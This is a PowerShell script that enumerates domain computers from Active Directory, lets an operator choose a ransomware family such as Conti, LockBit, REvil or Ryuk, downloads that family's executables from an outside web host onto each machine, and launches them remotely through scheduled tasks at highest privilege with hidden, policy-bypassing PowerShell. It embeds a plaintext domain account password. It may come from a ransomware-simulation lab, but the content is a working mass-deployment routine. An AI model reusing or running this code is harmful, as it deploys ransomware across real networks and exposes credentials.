 Function Get-HostType {
$type=Read-Host "
1 - Win10
2 - Server
Please choose"
Switch ($type){
1 {$choice="Win10"}
2 {$choice="Server"}
}
return $choice
}

$host_type = Get-HostType

if($host_type -eq "Win10")
 {$computers = Get-ADComputer -Filter {operatingsystem -like "*10*"} | Select -ExpandProperty DNSHostName}
else
 {$computers = Get-ADComputer -Filter {name -like "*server*"} | Select -ExpandProperty DNSHostName}

Function Get-VariantType {
$type=Read-Host "
1 - avaddon
2 - babuk
3 - blackmatter
4 - conti
5 - darkside
6 - lockbit
7 - maze
8 - mespinoza
9 - revil
10 - ryuk
11 - lockbit-report
Please choose"
Switch ($type){
1 {$choice="avaddon"}
2 {$choice="babuk"}
3 {$choice="blackmatter"}
4 {$choice="conti"}
5 {$choice="darkside"}
6 {$choice="lockbit"}
7 {$choice="maze"}
8 {$choice="mespinoza"}
9 {$choice="revil"}
10 {$choice="ryuk"}
11 {$choice="lockbit-report"}
}
return $choice
}

$variant = Get-VariantType

if ($variant -eq "lockbit-report") {

 Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/variants/files.txt" -OutFile "C:\files.txt"

 $file_list = Get-Content -Path C:\files.txt

 foreach ($element in $computers) {
   $x = [array]::IndexOf($computers,$element)
   foreach ($file in $file_list) {
     if ($file -match "^" + $x + "-.") {
       $filename = $file}
   }

   Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/variants/$Using:variant/$Using:filename" -OutFile "C:\ransom\$Using:filename"}
   Start-Sleep 15

   if ($filename -like "*.exe") {
     Invoke-Command -AsJob -ComputerName $element -ScriptBlock {

     $action = New-ScheduledTaskAction -Execute "C:\ransom\$using:filename";
     $taskname = $using:filename;
     $settings = New-ScheduledTaskSettingsSet -Priority 0

     Unregister-ScheduledTask -TaskName $taskname -Confirm:$false;
     Register-ScheduledTask -Action $action -User "SURGE\Shannon" -Password "Surg315C00l!" -TaskPath "\" -TaskName $taskname -RunLevel Highest -Settings $settings -Force ;
     Start-ScheduledTask -TaskName $taskname -AsJob
     }
   }

   if ($filename -like "*.ps1") {
     Invoke-Command -AsJob -ComputerName $element -ScriptBlock {

     $action = New-ScheduledTaskAction -Execute "powershell.exe -Argument -NoProfile -NoLogo -windowstyle Hidden -NonInteractive -ExecutionPolicy Bypass -File C:\ransom\$using:filename";
     $taskname = $using:filename;
     $settings = New-ScheduledTaskSettingsSet -Priority 0

     Unregister-ScheduledTask -TaskName $taskname -Confirm:$false;
     Register-ScheduledTask -Action $action -User "SURGE\Shannon" -Password "Surg315C00l!" -TaskPath "\" -TaskName $taskname -RunLevel Highest -Settings $settings -Force ;
     Start-ScheduledTask -TaskName $taskname -AsJob

     }
   }

    if ($filename -like "*.msi") {
     Invoke-Command -AsJob -ComputerName $element -ScriptBlock {

     $action = New-ScheduledTaskAction -Execute "msiexec.exe /i C:\ransom\$using:filename";
     $taskname = $using:filename;
     $settings = New-ScheduledTaskSettingsSet -Priority 0

     Unregister-ScheduledTask -TaskName $taskname -Confirm:$false;
     Register-ScheduledTask -Action $action -User "SURGE\Shannon" -Password "Surg315C00l!" -TaskPath "\" -TaskName $taskname -RunLevel Highest -Settings $settings -Force ;
     Start-ScheduledTask -TaskName $taskname -AsJob

     }
   }
 }
 }

elseif ($variant -ne "lockbit-report") {
 foreach ($element in $computers) {

 $x = [array]::IndexOf($computers,$element)
 $filename = $variant + "-" + $x + ".exe"

 Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -Uri "http://www.toadspestcontrols.com/ransomware/variants/$Using:variant/$Using:filename" -OutFile "C:\ransom\$Using:filename"}
 Start-Sleep 15
 Invoke-Command -AsJob -ComputerName $element -ScriptBlock {Start-Process C:\ransom\$Using:filename -Wait}
 }
} 
